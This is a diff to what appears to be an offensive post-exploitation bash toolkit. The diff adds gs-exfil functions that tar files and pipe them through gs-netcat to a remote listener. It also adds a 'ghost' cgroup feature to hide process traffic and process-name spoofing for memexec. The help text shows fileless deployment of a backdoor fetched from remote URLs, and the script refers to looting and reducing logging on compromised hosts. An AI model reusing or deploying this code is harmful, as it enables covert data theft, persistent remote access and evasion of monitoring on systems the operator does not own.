@@ -110,20 +110,20 @@ file-system to deploy your binary/backdoor.
 Examples:
 1. ${CDC}cat /usr/bin/id | memexec -u${CN}
 2. ${CDC}memexec https://thc.org/my-backdoor-binary${CN}
-3. ${CDC}memexec nmap${CN}
+3. ${CDC}NAME=/usr/bin/harmless memexec nmap${CN}
 
 Or a real world example to deploy gsocket without touching the file system
 or /dev/shm or /tmp (Change the -sSECRET please):
-${CDC}GS_ARGS=\"-ilD -sSecretChangeMe31337\" memexec https://gsocket.io/bin/gs-netcat_mini-linux-\$(uname -m)${CN}"
+${CDC}GS_ARGS=\"-ilD -sSecretChangeMe31337\" NAME=python3 memexec https://gsocket.io/bin/gs-netcat_mini-linux-\$(uname -m)${CN}"
 }
 
 xhelp_bounce() {
         echo -e "\
 ${CDM}Forward ingress traffic to _this_ host onwards to another host
 Usage: bounce <Local Port> <Destination IP> <Destination Port>
-${CDC} bounce 2222  10.0.0.1  22   ${CN}# Forward 2222 to internal host's port 22
-${CDC} bounce 31336 127.0.0.1 8080 ${CN}# Forward 31336 to server's 8080
-${CDC} bounce 31337 8.8.8.8   53   ${CN}# Forward 31337 to 8.8.8.8's 53${CDM}
+${CDC} bounce 2222  10.0.0.1  22       ${CN}# Forward 2222 to internal host's port 22
+${CDC} bounce 31336 127.0.0.1 8080     ${CN}# Forward 31336 to server's 8080
+${CDC} bounce 5353  8.8.8.8   53   udp ${CN}# Forward 31337 UDP to 8.8.8.8's 53${CDM}
 
 By default all source IPs are allowed to bounce. To limit to specific
 source IPs use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM}"
@@ -435,7 +435,7 @@ shred() {
 
 command -v srm >/dev/null || srm() { shred "$@"; }
 
-command -v strings >/dev/null || { command -v perl >/dev/null && strings() { perl -nle 'print $& while m/[[:print:]]{8,}/g' "$@"; }; }
+command -v strings >/dev/null || { command -v perl >/dev/null && strings() { LC_ALL=C perl -nle 'print $& while m/[[:print:]]{8,}/g' "$@"; }; }
 command -v strings >/dev/null || { command -v grep >/dev/null && strings() { grep -a -o -E '[[:print:]]{8,}' "$@"; }; }
 
 bounceinit() {
@@ -1143,11 +1143,12 @@ _loot_yandex() {
 # make GS-NETCAT command available if logged in via GSNC.
 gsnc() {
     [ -z "$GSNC" ] && return 255
-    _GS_ALLOWNOARG=1 "$GSNC" "$@"
+    # _GS_ALLOWNOARG=1 "$GSNC" "$@"
+    _GS_ALLOWNOARG=1 GS_ARGS="$*" "$GSNC"
 }
 # Show the GSNC config.
 gsconfig() {
-    GS_CONFIG_CHECK=1 GS_CONFIG_READ="$GSNC" gsnc || return
+    GS_CONFIG_CHECK=1 GS_CONFIG_READ= gsnc || return
     echo "GS_CONFIG_BIN='$GSNC'"
 }
 command -v gs-netcat >/dev/null || gs-netcat() { gsnc "$@"; }
@@ -1331,8 +1332,6 @@ _warn_upx_exe() {
     echo -en "${str}"$'\033[0m'
 }
 
-
-
 memdump() {
     local pid="${1:?}"
     local out x exe=$(readlink -f /proc/${pid}/exe 2>/dev/null)
@@ -1344,6 +1343,63 @@ memdump() {
         out="${pid}_${exe}_${x%%-*}-${x##*-}"
         gdb --batch --pid "$pid" "/proc/${pid}/exe" -ex "dump memory ${out} 0x${x%%-*} 0x${x##*-}" &>/dev/null
     done
+}
+
+gs-exfil-server() {
+    _hs_dep gs-netcat
+    _hs_dep tar
+    local s=$(gs-netcat -g)
+
+    echo -e "Transfer files with: ${CDC}SECRET=${s} gs-exfil <files>${CN}"
+    while :; do
+        gs-netcat -s "$s" -lr | tar --same-owner --preserve-permissions -xzvf -
+        sleep 5
+    done
+}
+
+gs-exfil() {
+    _hs_dep gs-netcat
+    _hs_dep tar
+    [ -z "$SECRET" ] && {
+        echo -e >&2 "Usage: Execute ${CDC}gs-exfil-server${CN} on any server first."
+        return 255
+    }
+
+    tar -czvf - "$@" | gs-netcat -s "$SECRET"
+}
+
+gs-sftp-server() {
+    _hs_dep gs-netcat
+    [ -z "$GSNC" ] && GSNC=$(command -v gs-netcat 2>/dev/null) && [ -z "$GSNC"] && {
+        echo >&2 "gs-netcat not found."
+        return 255
+    }
+    local s=$(${GSNC} -g)
+    local sftp_fn="/usr/lib/sftp-server"
+    [ ! -x "$sftp_fn" ] && sftp_fn="/usr/lib/openssh/sftp-server"
+    [ ! -x "$sftp_fn" ] && sftp_fn="/usr/libexec/sftp-server"
+    [ ! -x "$sftp_fn" ] && {
+        HS_ERR "sftp-server not found."
+        return 255
+    }
+
+    echo -e "Connect with: ${CDC}SECRET='$s' ${GS_HOST:+GS_HOST=$GS_HOST }${GS_PORT:+GS_PORT=$GS_PORT }gs-sftp${CN}"
+    echo -e "${CF}or with     : ${CDC}${CF}GS_ARGS='-s${s}' ${GS_HOST:+GS_HOST=$GS_HOST }${GS_PORT:+GS_PORT=$GS_PORT }sftp -D gs-netcat${CN}"
+    GSOCKET_NO_GREETINGS="1" GS_ARGS="-s${s}" ${GSNC} -l -e "$sftp_fn"
+}
+
+gs-sftp() {
+    _hs_dep sftp
+    [ -z "$GSNC" ] && GSNC=$(command -v gs-netcat 2>/dev/null) && [ -z "$GSNC"] && {
+        HS_ERR "gs-netcat not found."
+        return 255
+    }
+    [ -z "$SECRET" ] && {
+        echo -e >&2 "Usage: Execute ${CDC}gs-sftp-server${CN} on any server first."
+        return 255
+    }
+
+    GSOCKET_NO_GREETINGS="1" GS_ARGS="-s${SECRET}" sftp -D "$GSNC"
 }
 
 # <pid> <string-pattern>
@@ -2090,7 +2146,7 @@ xdestruct() {
 }
 
 _memexec() {
-    local name="${1}"
+    local name="${NAME:-$1}"
 
     _hs_dep perl || return
     shift
@@ -2205,7 +2261,7 @@ hs_init_dl() {
             local opts=()
             [ -n "$UNSAFE" ] && opts=("--no-check-certificate")
             # Can not use '-q' here because that also silences SSL/Cert errors
-            wget -O- "${opts[@]}" "${_HS_WGET_OPTS[@]}" "${1:?}"
+            wget -qO- "${opts[@]}" "${_HS_WGET_OPTS[@]}" "${1:?}"
         }
     elif [ -n "$HS_PY" ]; then
         dl() { purl "$@"; }
@@ -2410,6 +2466,34 @@ hs_init_alias() {
     hs_init_alias_reinit
 }
 
+_hs_init_ghost() {
+    [ -n "${_HS_CG_GHOST}" ] && [ "${_HS_CG_GHOST}" != "NA" ] && return 0
+    [ "${_HS_CG_GHOST}" = "NA" ] && return 255
+
+    local cg_root="/sys/fs/cgroup"
+    # Check for cgroup v2
+    [ ! -f "${cg_root}/cgroup.procs" ] && cg_root="/sys/fs/cgroup/unified"
+    # Not every grep supports -P. Redirect to /dev/null to avoid error message.
+    [ ! -f "${cg_root}/cgroup.procs" ] && cg_root="$(mount -t cgroup2 | head -n1 | grep -oP '^cgroup2 on \K\S+' 2>/dev/null)"
+    # Check for cgroup v1
+    [ ! -f "${cg_root}/cgroup.procs" ] && cg_root="/sys/fs/cgroup/net_cls"
+    [ ! -f "${cg_root}/cgroup.procs" ] && cg_root="$(mount -t cgroup | grep net_cls | head -n1 | grep -oP '^cgroup on \K\S+' 2>/dev/null)"
+    [ -f "${cg_root}"/update/cgroup.procs ] && {
+        _HS_CG_GHOST="${cg_root}/update/cgroup.procs"
+        return 0
+    }
+    _HS_CG_GHOST="NA"
+    return 255
+}
+
+ghost() {
+    _hs_init_ghost || return
+    [ -z "${_HS_CG_GHOST}" ] && return
+    [ -z "${1}" ] && { echo -e "PIDs using GhostIP:\n$(cat "${_HS_CG_GHOST}")"; return; }
+    echo "${1:?}" >"${_HS_CG_GHOST}"
+}
+
+
 hs_init_shell() {
     unset LC_TERMINAL LC_TERMINAL_VERSION
     # Some old bash log to default location if HISTFILE is not set. Force to /dev/null
@@ -2461,14 +2545,20 @@ hs_info() {
     local now="$(date +%s)"
     local mytty="$(tty 2>/dev/null)"
     local u x t out
-    out="$(awk -F= 'toupper($1)~/PRETTY/ {gsub(/"/,"",$2); print $2}' /etc/*release 2>/dev/null | sort -u)"
 
-    [ -z "$out" ] && out="$(uname -s 2>/dev/null)"
-    [ -n "$out" ] && out+=" "
-    echo -en ">>> ${CDG}"
-    echo -n "${out}"
-    echo -en "${CG}${CF}[$(uname -r)]"
-    echo -e "${CN}"
+    [ -z "$QUIET" ] && [ -z "$_HS_HUSH" ] && {
+        echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
+        echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
+        echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
+        echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
+        out="$(awk -F= 'toupper($1)~/PRETTY/ {gsub(/"/,"",$2); print $2}' /etc/*release 2>/dev/null | sort -u)"
+
+        [ -z "$out" ] && out="$(uname -s 2>/dev/null)"
+        [ -n "$out" ] && out+=" "
+        echo -en ">>> ${CDG}"
+        echo -n "${out}"
+        echo -e "${CG}${CF}[$(uname -r)]${CN}"
+    }
 
     # Show if any active PTY
     stat /dev/pts/* -c '%X %U %n' 2>/dev/null | while read -r x; do
@@ -2482,6 +2572,8 @@ hs_info() {
         ps a -o tty,pid,cmd 2>/dev/null | grep "${_HS_GREP_COLOR_NEVER[@]}" ^"${t#/dev/}" 2>/dev/null | cut -c -${COLUMNS:-80}
         echo -en "${CN}"
     done
+    # This will also init ghost()
+    _hs_init_ghost && echo -e "Ghost IP active. Try ${CDC}ghost <PID>${CN}"
 }
 
 # shellcheck disable=SC2120
@@ -2539,6 +2631,7 @@ _hs_init_color
 hs_init "$0"
 hs_init_alias
 hs_init_shell
+hs_info
 
 [ -z "$QUIET" ] && {
     ### Check for obvious loots
@@ -2547,20 +2640,13 @@ hs_init_shell
         echo -e ">>> Type ${CDC}loot${CN} or ${CDC}xhelp${CN} to get your started"
         # xhelp
 
-        ### Finishing
-        echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
-        echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
-        echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
-        echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
-        hs_info
-
+        lootlight
         # Warning if thc.org is used
         [ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CDM}'${CN}"
-
-        lootlight
     }
     export _HS_HUSH=1
 }
+
 
 
 # unset all functions that are no longer needed.
